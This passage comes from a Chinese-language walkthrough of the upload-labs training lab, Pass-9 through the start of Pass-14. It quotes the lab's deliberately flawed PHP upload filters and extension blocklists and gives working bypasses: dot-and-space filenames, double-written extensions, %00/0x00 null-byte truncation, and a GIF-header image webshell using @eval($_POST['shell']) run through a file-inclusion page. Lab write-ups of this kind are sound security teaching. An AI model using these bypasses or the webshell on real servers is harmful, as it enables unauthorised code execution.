punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        $file_ext <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        $file_ext <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> $file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        $file_ext <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span> $deny_ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span>$file_name<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p>由<code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code>得上传后文件的URL命名规则是由<code>$file_name</code>直接拼接而成</p><h4 id="解题步骤-8"><a href="#解题步骤-8" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>使用BP修改，上传文件名<code>shell.php. .</code></p></li><li><p>访问<a href="http://192.168.2.104/upload/shell.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/shell.php成功</a>~</p></li></ul><h3 id="Pass-10-嵌套绕过"><a href="#Pass-10-嵌套绕过" class="headerlink" title="Pass-10 嵌套绕过"></a>Pass-10 嵌套绕过</h3><h4 id="提示与查看源码-9"><a href="#提示与查看源码-9" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass会从文件名中去除.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|</p><p>.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|</p><p>.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php5"</span><span class="token punctuation">,</span><span class="token string">"php4"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">,</span><span class="token string">"php2"</span><span class="token punctuation">,</span><span class="token string">"html"</span><span class="token punctuation">,</span><span class="token string">"htm"</span><span class="token punctuation">,</span><span class="token string">"phtml"</span><span class="token punctuation">,</span><span class="token string">"pht"</span><span class="token punctuation">,</span><span class="token string">"jsp"</span><span class="token punctuation">,</span><span class="token string">"jspa"</span><span class="token punctuation">,</span><span class="token string">"jspx"</span><span class="token punctuation">,</span><span class="token string">"jsw"</span><span class="token punctuation">,</span><span class="token string">"jsv"</span><span class="token punctuation">,</span><span class="token string">"jspf"</span><span class="token punctuation">,</span><span class="token string">"jtml"</span><span class="token punctuation">,</span><span class="token string">"asp"</span><span class="token punctuation">,</span><span class="token string">"aspx"</span><span class="token punctuation">,</span><span class="token string">"asa"</span><span class="token punctuation">,</span><span class="token string">"asax"</span><span class="token punctuation">,</span><span class="token string">"ascx"</span><span class="token punctuation">,</span><span class="token string">"ashx"</span><span class="token punctuation">,</span><span class="token string">"asmx"</span><span class="token punctuation">,</span><span class="token string">"cer"</span><span class="token punctuation">,</span><span class="token string">"swf"</span><span class="token punctuation">,</span><span class="token string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span>$deny_ext<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> $file_name<span class="token punctuation">)</span><span class="token punctuation">;</span>        $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span>$file_name<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>只对文件后缀名进行一次过滤，双写文件名绕过。</p><h4 id="解题步骤-9"><a href="#解题步骤-9" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>上传文件名<code>shell.pphphp</code></p></li><li><p>访问<a href="http://192.168.2.104/upload/shell.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/shell.php成功</a>~</p></li></ul><h3 id="Pass-11-GET型00截断"><a href="#Pass-11-GET型00截断" class="headerlink" title="Pass-11 GET型00截断"></a>Pass-11 GET型00截断</h3><h4 id="提示与查看源码-10"><a href="#提示与查看源码-10" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass上传路径可控！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $ext_arr <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $file_ext <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span>$ext_arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        $img_path <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span>$file_ext<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        $msg <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li>服务器端上传文件名的后缀做了限制</li><li><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>可知上传路径命名规则使用用户<code>get</code>请求的<code>save_path</code>值拼接而成。</li><li>考虑使用上传路径名<code>%00</code>截断绕过，不过这需要对文件有足够的权限，比如说创建文件夹，上传的文件名写成shell.jpg<code>,</code>save_path<code>改成</code>../upload/1.php%00<code>，最后保存下来的文件就是</code>1.php`</li></ul><h4 id="解题步骤-10"><a href="#解题步骤-10" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>上传文件名<code>../upload/shell.php%00</code></p><p><img src="http://106.52.86.96/202009060800/image-20200907001129143.png" alt=""></p></li><li><p>访问<a href="http://192.168.2.104/upload/shell.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/shell.php成功</a>~</p></li></ul><h3 id="Pass-12-POST型00截断"><a href="#Pass-12-POST型00截断" class="headerlink" title="Pass-12 POST型00截断"></a>Pass-12 POST型00截断</h3><h4 id="提示与查看源码-11"><a href="#提示与查看源码-11" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass上传路径可控！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $ext_arr <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $file_ext <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span>$ext_arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        $img_path <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span>$file_ext<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"上传失败"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><code>$img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>和<code>Pass-11</code>相比将<code>GET</code>换为了<code>POST</code>，思路相同</li><li>这次的<code>save_path</code>是通过<code>post</code>传进来的，在进行<code>00</code>截断时需要在<code>hex</code>中修改</li></ul><h4 id="解题步骤-11"><a href="#解题步骤-11" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li>修改<code>post</code>参数的值，这里在php的后面添加了一个空格和字母a,其实写什么都可以，只是一般空格的16进制为0x20，比较好记，加个a好找到空格的位置，如果写个任意字符，再去查他的16进制表示也可以：</li></ul><p><img src="http://106.52.86.96/202009060800/image-20200907002833684.png" alt=""></p><p><img src="http://106.52.86.96/202009060800/image-20200907003006574.png" alt=""></p><ul><li>访问<a href="http://192.168.2.104/upload/shell.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/shell.php成功</a>~</li></ul><h5 id="00截断原理"><a href="#00截断原理" class="headerlink" title="00截断原理"></a><code>00</code>截断原理</h5><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>系统在对文件名按16进制读取文件（或者说二进制）时，如果遇到<code>0x00</code>(<code>ascii</code>码为零)，就会认为读取已结束。所以本来上传的<code>info12.jpg</code>文件名就被替换为<code>info12.php</code>。</p><h5 id="00与0x00截断"><a href="#00与0x00截断" class="headerlink" title="%00与0x00截断"></a><code>%00</code>与<code>0x00</code>截断</h5><p>原理一样，只是在<code>Pass-11</code>中为<code>GET</code>方式，服务器在进行URL解码时将其解码成<code>0x00</code>,<code>Pass-12</code>中为<code>POST</code>方式，没有URL解码这一步骤，所以要在hex值中修改，形成<code>0x00</code>截断。</p><h3 id="Pass-13-图马"><a href="#Pass-13-图马" class="headerlink" title="Pass-13 图马"></a>Pass-13 图马</h3><h4 id="提示与查看源码-12"><a href="#提示与查看源码-12" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass检查图标内容开头2个字节！</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">{</span>    $file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>$filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $bin <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>$file<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//只读2字节</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">;</span>    $strInfo <span class="token operator">=</span> @<span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"C2chars"</span><span class="token punctuation">,</span> $bin<span class="token punctuation">)</span><span class="token punctuation">;</span>        $typeCode <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span>$strInfo<span class="token punctuation">[</span><span class="token string">'chars1'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>$strInfo<span class="token punctuation">[</span><span class="token string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $fileType <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>$typeCode<span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">case</span> <span class="token number">255216</span><span class="token punctuation">:</span>                        $fileType <span class="token operator">=</span> <span class="token string">'jpg'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">13780</span><span class="token punctuation">:</span>                        $fileType <span class="token operator">=</span> <span class="token string">'png'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">7173</span><span class="token punctuation">:</span>                        $fileType <span class="token operator">=</span> <span class="token string">'gif'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>                        $fileType <span class="token operator">=</span> <span class="token string">'unknown'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token keyword">return</span> $fileType<span class="token punctuation">;</span><span class="token punctuation">}</span>$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $file_type <span class="token operator">=</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$file_type <span class="token operator">==</span> <span class="token string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $msg <span class="token operator">=</span> <span class="token string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span>$file_type<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li>服务端检测文件头，并将上传文件的后缀重命名为检测到的文件类型</li><li>关于服务端检测文件头，我们可以在文件起始加入<code>jpg|png|gif</code>文件的文件头来绕过</li></ul><blockquote><p>十进制转十六进制: <code>gif</code>为47 49 ， <code>png</code>为89 50， <code>jpg</code>为ff d8</p></blockquote><ul><li><p>关于文件上传后被重命名为图片文件，不能当做<code>php</code>解析，我们可以利用文件包含漏洞</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre></li></ul><h4 id="解题步骤-12"><a href="#解题步骤-12" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><code>gif</code>文件头为<code>GIF89a</code>，上传文件<code>info13.php</code>:</li></ul><pre class=" language-php"><code class="language-php">GIF89a<span class="token delimiter">&lt;?php</span>     <span class="token keyword">echo</span> <span class="token string">"Let's Do it !"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li>利用文件包含漏洞访问上传文件，<a href="http://192.168.2.104/include.php?file=upload/5120200907005027.gif" target="_blank" rel="noopener">http://192.168.2.104/include.php?file=upload/5120200907005027.gif</a></li></ul><p><img src="http://106.52.86.96/202009060800/image-20200907005229692.png" alt=""></p><ul><li><code>png</code>文件头文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0a</li></ul><p><img src="http://106.52.86.96/202009060800/684680361-5d009e2f73b5a_articlex.png" alt=""></p><ul><li><code>jpg</code>文件头标识 (2 bytes): ff, d8</li></ul><p><img src="http://106.52.86.96/202009060800/1767031429-5d00a854c1ae1_articlex.png" alt=""></p><h3 id="Pass-14-getimagesize"><a href="#Pass-14-getimagesize" class="headerlink" title="Pass-14 getimagesize"></a>Pass-14 getimagesize</h3><h4 id="提示与查看源码-13"><a href="#提示与查看源码-13" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass使用getimagesize()检查是否为图片文件！</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">isImage</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">{</span>    $types <span class="token operator">=</span> <span class="token string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $info <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        $ext <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span>$info<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span>$types<span class="token punctuation">,</span>$ext<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> $ext<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token 